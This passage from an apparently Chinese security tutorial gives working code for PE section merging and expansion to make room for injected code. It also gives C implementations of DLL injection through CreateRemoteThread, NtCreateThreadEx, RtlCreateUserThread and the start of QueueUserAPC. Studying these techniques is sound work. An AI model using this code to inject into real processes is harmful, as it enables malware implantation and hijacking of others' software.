pe.sections[-<span class="number">1</span>]  </span><br><span class="line">    name1 = section1.Name.decode().rstrip(<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">    name2 = section2.Name.decode().rstrip(<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">    virtual_size1 = section2.VirtualAddress - section1.VirtualAddress  </span><br><span class="line">      </span><br><span class="line">    data1 = section1.get_data()  </span><br><span class="line">    data2 = section2.get_data()  </span><br><span class="line">    padding = (virtual_size1 - section1.SizeOfRawData) * <span class="string">b&#x27;\x00&#x27;</span>  </span><br><span class="line">    <span class="comment"># 修改属性  </span></span><br><span class="line">    pe.FILE_HEADER.NumberOfSections -= <span class="number">1</span>  </span><br><span class="line">    pe.OPTIONAL_HEADER.SizeOfImage += <span class="built_in">len</span>(padding)  </span><br><span class="line">    <span class="comment"># 修改节表  </span></span><br><span class="line">    section1.SizeOfRawData = virtual_size1 + section2.Misc_VirtualSize  </span><br><span class="line">    section1.Misc_VirtualSize = virtual_size1 + section2.SizeOfRawData  </span><br><span class="line">    section1.Characteristics |= section2.Characteristics  </span><br><span class="line">    <span class="comment"># pe.set_bytes_at_offset(section2.__file_offset__, b&#x27;\x00&#x27; * 40)  </span></span><br><span class="line">    <span class="comment"># 填充节数据  </span></span><br><span class="line">    <span class="comment"># begin = section1.PointerToRawData  </span></span><br><span class="line">    pe.set_data_bytes(section1.PointerToRawData, data1+padding+data2)  </span><br><span class="line">    <span class="comment"># pe.__data__ = pe.__data__[:begin] + data1 + padding + data2  </span></span><br><span class="line">    <span class="comment"># 写入文件  </span></span><br><span class="line">    modified_filename = filename.replace(<span class="string">&#x27;.exe&#x27;</span>, <span class="string">&#x27;_merged.exe&#x27;</span>)  </span><br><span class="line">    pe.write(modified_filename)  </span><br><span class="line">    pe.close()  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] The section <span class="subst">&#123;name2&#125;</span> has been merged to <span class="subst">&#123;name1&#125;</span>.&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Modified PE file saved as: <span class="subst">&#123;modified_filename&#125;</span>.&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="1-6-扩展节"><a href="#1-6-扩展节" class="headerlink" title="1.6 扩展节"></a>1.6 扩展节</h3><p>如果不新增节，而现有的代码空洞又不足以注入，可以通过修改节表数据，将现有的节的长度增加。这里实现的是扩展最后一个节。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">expand_section</span>(<span class="params">filename, data_size</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    扩展节（最后一个节）  </span></span><br><span class="line"><span class="string">    :return: offset of the expanded part of the last section data  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    pe = PE(filename)  </span><br><span class="line">    last_section = pe.sections[-<span class="number">1</span>]  </span><br><span class="line">    data_size += <span class="number">5</span>  </span><br><span class="line">    cave_size = last_section.SizeOfRawData - last_section.Misc_VirtualSize  </span><br><span class="line">    <span class="keyword">if</span> cave_size &gt;= data_size:  </span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;[!] The cave is enough to use, No section expand.&quot;</span>)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    offset = last_section.PointerToRawData + last_section.Misc_VirtualSize  </span><br><span class="line">    rva = last_section.VirtualAddress + last_section.Misc_VirtualSize  </span><br><span class="line">    last_name = last_section.Name.decode().rstrip(<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">    expand_size = math.ceil(  </span><br><span class="line">       (data_size - cave_size) / pe.OPTIONAL_HEADER.FileAlignment) * pe.OPTIONAL_HEADER.FileAlignment  </span><br><span class="line">    <span class="comment"># 修改节区头属性  </span></span><br><span class="line">    last_section.SizeOfRawData += expand_size  </span><br><span class="line">    last_section.Misc_VirtualSize += expand_size  </span><br><span class="line">    last_section.Characteristics |= <span class="number">0x60000000</span>  </span><br><span class="line">    <span class="comment"># 计算内存对齐，修改SizeOfImage  </span></span><br><span class="line">    pe.OPTIONAL_HEADER.SizeOfImage += pe.OPTIONAL_HEADER.SectionAlignment * (  </span><br><span class="line">          math.ceil(last_section.Misc_VirtualSize / pe.OPTIONAL_HEADER.SectionAlignment)  </span><br><span class="line">          - math.ceil((last_section.Misc_VirtualSize - expand_size) / pe.OPTIONAL_HEADER.SectionAlignment))  </span><br><span class="line">    <span class="comment"># 填充节区数据  </span></span><br><span class="line">    padding = <span class="string">b&#x27;\x00&#x27;</span> * expand_size  </span><br><span class="line">    <span class="comment"># pe.__data__ = pe.__data__[:] + padding  </span></span><br><span class="line">    pe.set_data_bytes(<span class="built_in">len</span>(pe.__data__), padding)  </span><br><span class="line">    <span class="comment"># 写入文件  </span></span><br><span class="line">    modified_filename = filename.replace(<span class="string">&#x27;.exe&#x27;</span>, <span class="string">&#x27;_expanded.exe&#x27;</span>)  </span><br><span class="line">    pe.write(modified_filename)  </span><br><span class="line">    pe.close()  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] The <span class="subst">&#123;last_name&#125;</span> section is extended by <span class="subst">&#123;expand_size&#125;</span> bytes.&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\t[-] FOA:\t<span class="subst">&#123;<span class="built_in">hex</span>(offset)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)&#125;</span>h&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\t[-] RVA:\t<span class="subst">&#123;<span class="built_in">hex</span>(rva)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)&#125;</span>h&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Modified PE file saved as: <span class="subst">&#123;modified_filename&#125;</span>.&quot;</span>)  </span><br><span class="line">    <span class="keyword">return</span> offset</span><br></pre></td></tr></table></figure>
<h2 id="2-DLL注入"><a href="#2-DLL注入" class="headerlink" title="2 DLL注入"></a>2 DLL注入</h2><p>DLL注入就是让进程加载我们构造的DLL文件，执行代码。与PE注入不同的是，DLL的注入是动态的，是在内存中进行操作的，相对来说复杂一些，网上提到最多的基本就是这四种，其他还有一些特殊利用以后遇到的话再补充。<br>参考了<em><strong>injectAllTheThings</strong></em>项目，本来是用Python写的，但是要处理32位程序的话不太方便，于是用C又写了一遍，没啥耐心了，大部分代码都是借鉴这个项目。</p>
<h3 id="2-1-创建远程线程"><a href="#2-1-创建远程线程" class="headerlink" title="2.1 创建远程线程"></a>2.1 创建远程线程</h3><h4 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h4><p>通过在目标进程的内存中写入DLL的绝对路径，然后调用CreateRemoteThread函数，将LoadLibrary作为回调函数传入，内存中的DLL路径地址作为回调函数的参数，以此实现DLL的注入。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;headers.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">demoCreateRemoteThread</span><span class="params">(LPCSTR pszDllPath, DWORD dwPid)</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwSize = <span class="built_in">strlen</span>(pszDllPath);</span><br><span class="line">	<span class="comment">// 打开进程</span></span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Open process failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//printf(&quot;Path Length：%d\n&quot;, dwSize);</span></span><br><span class="line">	<span class="comment">// 开辟内存</span></span><br><span class="line">	LPVOID pszDllAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (pszDllAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] VirtualAllocEx failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 写入内存</span></span><br><span class="line">	<span class="keyword">if</span> (!WriteProcessMemory(hProcess, pszDllAddr, pszDllPath, <span class="built_in">strlen</span>(pszDllPath) + <span class="number">1</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Write process memory failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 获取LoadLibraryA函数地址</span></span><br><span class="line">	PROC pfnProcAddr= GetProcAddress(GetModuleHandleA(<span class="string">&quot;Kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (pfnProcAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] GetProcAddress failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 创建远程线程</span></span><br><span class="line">	HANDLE hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pfnProcAddr, pszDllAddr, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Create remote thread failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Inject DLL by CreateRemoteThread success!\n&quot;</span>);</span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line">	VirtualFreeEx(hProcess, pszDllAddr, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="NtCreateThreadEx"><a href="#NtCreateThreadEx" class="headerlink" title="NtCreateThreadEx"></a>NtCreateThreadEx</h4><p>这是一个未公开的API，需要自己定义函数结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(WINAPI* LPFUN_NtCreateThreadEx)</span> </span><br><span class="line"><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE hThread,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	BOOL CreateSuspended,</span></span><br><span class="line"><span class="params">	ULONG StackZeroBits,</span></span><br><span class="line"><span class="params">	ULONG SizeOfStackCommit,</span></span><br><span class="line"><span class="params">	ULONG SizeOfStackReserve,</span></span><br><span class="line"><span class="params">	LPVOID lpBytesBuffer</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>注入原理和CreateRemoteThread类似，也是通过创建远程线程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;headers.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">demoNtCreateThreadEx</span><span class="params">(LPCSTR pszDllPath, DWORD dwPid)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hRemoteThread = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD dwSize = <span class="built_in">strlen</span>(pszDllPath);</span><br><span class="line">	<span class="comment">// 打开进程</span></span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Open process failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 开辟内存</span></span><br><span class="line">	LPVOID pszDllAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (pszDllAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] VirtualAllocEx failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 写入内存</span></span><br><span class="line">	<span class="keyword">if</span> (!WriteProcessMemory(hProcess, pszDllAddr, pszDllPath, <span class="built_in">strlen</span>(pszDllPath) + <span class="number">1</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Write process memory failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 获取LoadLibraryA函数地址</span></span><br><span class="line">	PROC pfnProcAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;Kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (pfnProcAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] GetProcAddress failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 获取NtCreateThreadEx函数地址</span></span><br><span class="line">	PROC pfnNtCreateThreadEx = GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;ntdll.dll&quot;</span>)), <span class="string">&quot;NtCreateThreadEx&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (pfnNtCreateThreadEx == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Get NtCreateThreadEx Address failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	LPFUN_NtCreateThreadEx funNtCreateThreadEx = (LPFUN_NtCreateThreadEx)pfnNtCreateThreadEx;</span><br><span class="line">	NTSTATUS status = funNtCreateThreadEx(&amp;hRemoteThread, <span class="number">0x1FFFFF</span>, <span class="literal">NULL</span>, hProcess, (PTHREAD_START_ROUTINE)pfnProcAddr,</span><br><span class="line">		pszDllAddr, FALSE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!status) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Call NtCreateThreadEx failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Inject DLL by NtCreateThreadEx success!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	VirtualFreeEx(hProcess, pszDllAddr, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="RtlCreateUserThread"><a href="#RtlCreateUserThread" class="headerlink" title="RtlCreateUserThread"></a>RtlCreateUserThread</h4><p>对NtCreateThreadEx函数的封装，也是未公开的API。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* LPFUN_RtlCreateUserThread)</span></span><br><span class="line"><span class="params">(</span></span><br><span class="line"><span class="params">	IN HANDLE 					ProcessHandle,</span></span><br><span class="line"><span class="params">	IN PSECURITY_DESCRIPTOR 	SecurityDescriptor,</span></span><br><span class="line"><span class="params">	IN BOOL 					CreateSuspended,</span></span><br><span class="line"><span class="params">	IN ULONG					StackZeroBits,</span></span><br><span class="line"><span class="params">	IN OUT PULONG				StackReserved,</span></span><br><span class="line"><span class="params">	IN OUT PULONG				StackCommit,</span></span><br><span class="line"><span class="params">	IN LPVOID					StartAddress,</span></span><br><span class="line"><span class="params">	IN LPVOID					StartParameter,</span></span><br><span class="line"><span class="params">	OUT HANDLE 					ThreadHandle,</span></span><br><span class="line"><span class="params">	OUT LPVOID					ClientID</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;headers.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">demoRtlCreateUserThread</span><span class="params">(LPCSTR pszDllPath, DWORD dwPid)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hRemoteThread = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD dwSize = <span class="built_in">strlen</span>(pszDllPath);</span><br><span class="line">	<span class="comment">// 打开进程</span></span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Open process failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 开辟内存</span></span><br><span class="line">	LPVOID pszDllAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (pszDllAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] VirtualAllocEx failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 写入内存</span></span><br><span class="line">	<span class="keyword">if</span> (!WriteProcessMemory(hProcess, pszDllAddr, pszDllPath, <span class="built_in">strlen</span>(pszDllPath) + <span class="number">1</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Write process memory failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 获取LoadLibraryA函数地址</span></span><br><span class="line">	PROC pfnProcAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;Kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (pfnProcAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] GetProcAddress failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	PROC pfnRtlCreateUserThread = GetProcAddress(GetModuleHandleA(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;RtlCreateUserThread&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (pfnRtlCreateUserThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Get pfnRtlCreateUserThread Address failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	LPFUN_RtlCreateUserThread funRtlCreateUserThread = (LPFUN_RtlCreateUserThread)pfnRtlCreateUserThread;</span><br><span class="line">	DWORD status = funRtlCreateUserThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line">		pfnProcAddr, pszDllAddr, &amp;hRemoteThread, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (status!=<span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Call RtlCreateUserThread failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Inject DLL by RtlCreateUserThread success!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	VirtualFreeEx(hProcess, pszDllAddr, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-2-线程劫持"><a href="#2-2-线程劫持" class="headerlink" title="2.2 线程劫持"></a>2.2 线程劫持</h3><h4 id="QueueUserAPC"><a href="#QueueUserAPC" class="headerlink" title="QueueUserAPC"></a>QueueUserAPC</h4><p>通过添加线程的APC队列，使得线程被再次执行时会调用APC队列中的函数。并不是每个线程都会被执行，在注入时可以向目标进程的所有线程中都注入一次，我测试的是Sublime_Text，注入所有线程后可以稳定触发。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;headers.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">demoQueueUserAPC</span><span class="params">(LPCSTR pszDllPath, DWORD 